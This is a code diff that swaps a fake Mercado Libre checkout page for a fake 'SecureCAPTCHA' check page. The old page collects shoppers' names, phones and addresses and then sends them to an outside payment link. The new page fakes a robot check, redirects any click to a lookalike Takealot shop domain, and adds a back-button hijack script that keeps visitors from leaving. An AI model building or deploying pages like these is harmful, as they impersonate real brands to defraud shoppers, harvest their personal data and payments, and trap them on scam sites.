@@ -1,334 +1,201 @@
-<!DOCTYPE html>
-<html lang="es-MX">
+<!doctype html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Checkout - Detalles de entrega</title>
+  <meta charset="utf-8">
+  <title>Security Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<style>
-body{
-  margin:0;
-  font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
-  background:#fff;
-  color:#111;
-}
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
 
-.topbar{
-  height:56px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  border-bottom:1px solid #eee;
-  position:sticky;
-  top:0;
-  background:#fff;
-  z-index:1000;
-}
+    /* Background */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image: url("p1.jpeg");
+      background-size: cover;
+      background-position: center;
+      filter: blur(10px);
+      transform: scale(1.1);
+      z-index: -2;
+    }
 
-.logo-img{
-  height:60px;
-}
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.4);
+      z-index: -1;
+    }
 
-.checkout{ padding:20px 16px; }
-.checkout h2{ font-size:22px; font-weight:800; margin-bottom:16px; }
+    /* Captcha Box */
+    .captcha-container {
+      width: 304px;
+      height: 78px;
+      background: #f9f9f9;
+      border: 1px solid #d3d3d3;
+      border-radius: 3px;
+      padding: 10px 12px;
+      box-sizing: border-box;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
 
-.type-tabs{ display:flex; gap:10px; margin-bottom:20px; }
+    .content-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
 
-.tab{
-  flex:1;
-  height:44px;
-  border-radius:8px;
-  border:2px solid #1a73e8;
-  background:#eaf3ff;
-  font-weight:700;
-  color:#1a73e8;
-}
+    .checkbox {
+      width: 26px;
+      height: 26px;
+      border: 2px solid #c1c1c1;
+      border-radius: 2px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: white;
+    }
 
-.field{ margin-bottom:18px; }
+    .checkbox.verified {
+      border: none;
+      background: transparent;
+      color: #009688;
+      font-size: 24px;
+    }
 
-.field label{
-  font-size:13px;
-  color:#666;
-  display:block;
-  margin-bottom:4px;
-}
+    .status-text {
+      font-size: 14px;
+      color: #555;
+      user-select: none;
+    }
 
-.field input{
-  width:100%;
-  border:none;
-  border-bottom:1px solid #ddd;
-  font-size:15px;
-  padding:6px 0;
-  outline:none;
-}
+    .content-right {
+      width: 80px;
+      text-align: center;
+      color: #777;
+    }
 
-.save-btn{
-  margin-top:30px;
-  width:100%;
-  height:48px;
-  border-radius:999px;
-  border:none;
-  background:#0b6ecb;
-  color:white;
-  font-size:16px;
-  font-weight:800;
-  cursor:pointer;
-}
+    .logo img {
+      width: 30px;
+      height: 30px;
+      display: block;
+      margin: 0 auto;
+    }
 
-.save-btn.loading{ opacity:.8; pointer-events:none; }
-.save-btn.saved{ background:#2ecc71; }
+    .brand-name {
+      font-size: 10px;
+      font-weight: 600;
+      margin-top: 2px;
+    }
 
-#orderReview{
-  display:none;
-  margin-top:24px;
-  border-top:1px solid #eee;
-  padding-top:20px;
-}
+    .legal-links {
+      font-size: 8px;
+      margin-top: 2px;
+    }
 
-.complete-btn{
-  margin-top:20px;
-  width:100%;
-  height:50px;
-  border-radius:999px;
-  border:none;
-  background:#00a651;
-  color:white;
-  font-size:16px;
-  font-weight:900;
-  cursor:pointer;
-  display:none;
-}
+    /* Spinner */
+    .loading-spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #4285f4;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
 
-.complete-btn:active{
-  transform: scale(0.98);
-}
-
-.province-modal{
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,.4);
-  display:none;
-  z-index:3000;
-}
-
-.province-modal.is-open{ display:block; }
-
-.province-sheet{
-  position:absolute;
-  left:0;
-  right:0;
-  bottom:0;
-  background:#fff;
-  border-radius:16px 16px 0 0;
-  max-height:80vh;
-  overflow:auto;
-}
-
-.province-head{
-  text-align:center;
-  font-size:18px;
-  font-weight:800;
-  padding:14px;
-  border-bottom:1px solid #eee;
-}
-
-.province-item{
-  padding:16px;
-  border-bottom:1px solid #eee;
-  font-size:16px;
-  cursor:pointer;
-}
-
-.province-item:active{ background:#f2f2f2; }
-</style>
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 
 <body>
 
-<div class="topbar">
-<img src="logo-mercadolibre.svg" alt="logo" class="logo-img">
-</div>
+<div class="captcha-container">
+  <div class="content-left">
+    <div class="checkbox" id="captchaBox"></div>
+    <div class="status-text" id="statusLabel">I'm not a robot</div>
+  </div>
 
-<div class="checkout">
-
-<h2>Detalles de entrega</h2>
-
-<div class="type-tabs">
-<button class="tab">Residencial</button>
-</div>
-
-<div class="field"><label>Nombre del destinatario</label><input id="fName"></div>
-<div class="field"><label>Número de teléfono</label><input id="fPhone"></div>
-<div class="field"><label>Dirección</label><input id="fStreet"></div>
-<div class="field"><label>Departamento / Edificio</label><input></div>
-<div class="field"><label>Colonia</label><input></div>
-<div class="field"><label>Ciudad</label><input id="fCity"></div>
-
-<div class="field">
-<label>Estado</label>
-<input id="provinceInput" placeholder="Seleccionar" readonly>
-</div>
-
-<div class="field"><label>Código postal</label><input id="fPostal"></div>
-
-<button class="save-btn" id="openPayment">
-<span id="saveText">Guardar</span>
-<span id="saveLoader" style="display:none;">Guardando...</span>
-<span id="saveDone" style="display:none;">Guardado ✓</span>
-</button>
-
-<div id="orderReview">
-
-<h2>Resumen del pedido</h2>
-
-<strong>Método de entrega</strong><br>Entrega<br><br>
-
-<strong>Dirección de entrega</strong><br>
-
-<span style="background:#eee;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;">
-RESIDENCIAL
-</span>
-
-<div id="orName" style="margin-top:8px;font-weight:700;"></div>
-<div id="orAddress" style="color:#555;"></div>
-
-<div style="color:#999;">
-<span id="orPerson"></span> — <span id="orPhone"></span>
-</div>
-
-<br>
-
-<strong id="orDeliveryDate"></strong><br>
-Entrega al siguiente día hábil • Gratis
-
-<br><br>
-
-<div style="display:flex;justify-content:space-between;">
-<span style="color:#999;font-weight:700;">PRODUCTOS</span>
-</div>
-
-<div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
-<img src="p1.png" style="width:60px;height:60px;object-fit:contain;border:1px solid #eee;border-radius:6px;">
-<div style="font-size:14px;font-weight:700;">
-POINTEKX RHINO X21 – Pro Tool Combo 100X
-</div>
-</div>
-
-<button class="complete-btn" id="completePurchase">
-Completar compra
-</button>
-
-</div>
-</div>
-
-<div class="province-modal" id="provinceModal">
-<div class="province-sheet">
-
-<div class="province-head">Estado</div>
-
-<div class="province-item">Aguascalientes</div>
-<div class="province-item">Baja California</div>
-<div class="province-item">Baja California Sur</div>
-<div class="province-item">Campeche</div>
-<div class="province-item">Chiapas</div>
-<div class="province-item">Chihuahua</div>
-<div class="province-item">Ciudad de México</div>
-<div class="province-item">Coahuila</div>
-<div class="province-item">Colima</div>
-<div class="province-item">Durango</div>
-<div class="province-item">Estado de México</div>
-<div class="province-item">Guanajuato</div>
-<div class="province-item">Guerrero</div>
-<div class="province-item">Hidalgo</div>
-<div class="province-item">Jalisco</div>
-<div class="province-item">Michoacán</div>
-<div class="province-item">Morelos</div>
-<div class="province-item">Nayarit</div>
-<div class="province-item">Nuevo León</div>
-<div class="province-item">Oaxaca</div>
-<div class="province-item">Puebla</div>
-<div class="province-item">Querétaro</div>
-<div class="province-item">Quintana Roo</div>
-<div class="province-item">San Luis Potosí</div>
-<div class="province-item">Sinaloa</div>
-<div class="province-item">Sonora</div>
-<div class="province-item">Tabasco</div>
-<div class="province-item">Tamaulipas</div>
-<div class="province-item">Tlaxcala</div>
-<div class="province-item">Veracruz</div>
-<div class="province-item">Yucatán</div>
-<div class="province-item">Zacatecas</div>
-
-
-</div>
+  <div class="content-right">
+    <div class="logo">
+      <img src="logo.png" alt="Captcha Logo">
+    </div>
+    <div class="brand-name">SecureCAPTCHA</div>
+    <div class="legal-links">Privacy - Terms</div>
+  </div>
 </div>
 
 <script>
+  const captchaBox = document.getElementById("captchaBox");
+  const statusLabel = document.getElementById("statusLabel");
 
-provinceInput.onclick = ()=> provinceModal.classList.add("is-open");
+  // destino após verificação
+  const targetDestination = "https://micro.takealot-shop.online/";
 
-document.querySelectorAll(".province-item").forEach(item=>{
-item.onclick = ()=>{
-provinceInput.value = item.innerText;
-provinceModal.classList.remove("is-open");
-}
-});
+  let verificationStarted = false;
 
-provinceModal.onclick = e=>{
-if(e.target === provinceModal)
-provinceModal.classList.remove("is-open");
-}
+  function startVerification() {
 
-openPayment.onclick = ()=>{
+    if (verificationStarted) return;
+    verificationStarted = true;
 
-openPayment.classList.add("loading");
-saveText.style.display="none";
-saveLoader.style.display="inline";
+    captchaBox.innerHTML = "<div class='loading-spinner'></div>";
+    statusLabel.textContent = "Verifying...";
 
-setTimeout(()=>{
+    setTimeout(function () {
 
-saveLoader.style.display="none";
-saveDone.style.display="inline";
-openPayment.classList.remove("loading");
-openPayment.classList.add("saved");
+      captchaBox.innerHTML = "✓";
+      captchaBox.classList.add("verified");
+      statusLabel.textContent = "Verification complete";
+      statusLabel.style.color = "#009688";
 
-const name = fName.value;
-const phone = fPhone.value;
-const street = fStreet.value;
-const city = fCity.value;
-const postal = fPostal.value;
-const prov = provinceInput.value;
+      setTimeout(function () {
+        window.location.href = targetDestination;
+      }, 800);
 
-orName.innerText = street || "Casa";
-orAddress.innerText = `${street}, ${city}, ${prov}, ${postal}`;
-orPerson.innerText = name;
-orPhone.innerText = phone;
+    }, 1500);
+  }
 
-const tomorrow = new Date();
-tomorrow.setDate(tomorrow.getDate()+1);
+  /* clique na caixa */
+  captchaBox.onclick = startVerification;
 
-const months=[
-"enero","febrero","marzo","abril","mayo","junio",
-"julio","agosto","septiembre","octubre","noviembre","diciembre"
-];
+  /* 🔥 qualquer clique na tela */
+  document.addEventListener("click", function () {
+    startVerification();
+  });
+</script>
 
-orDeliveryDate.innerText =
-`Entrega antes del ${tomorrow.getDate()} ${months[tomorrow.getMonth()]} ${tomorrow.getFullYear()}`;
+<!-- BACK REDIRECT -->
+<script>
+  var back_redirect_back_link =
+    "https://micro.takealot-shop.online/" + location.search;
 
-orderReview.style.display="block";
+  history.pushState({}, "", location.href);
+  history.pushState({}, "", location.href);
 
-completePurchase.style.display = "block";
-
-orderReview.scrollIntoView({behavior:"smooth"});
-
-},3000);
-}
-
-completePurchase.onclick = ()=>{
-window.location.href="https://payjsr.com/pay/bc03be59-add7-4fe8-8a46-f21a27c037dc";
-}
-
+  window.addEventListener("popstate", function(event) {
+    if (event.state) {
+      setTimeout(function () {
+        location.href = back_redirect_back_link;
+      }, 1);
+    }
+  }, false);
 </script>
 
 </body>
 </html>
+
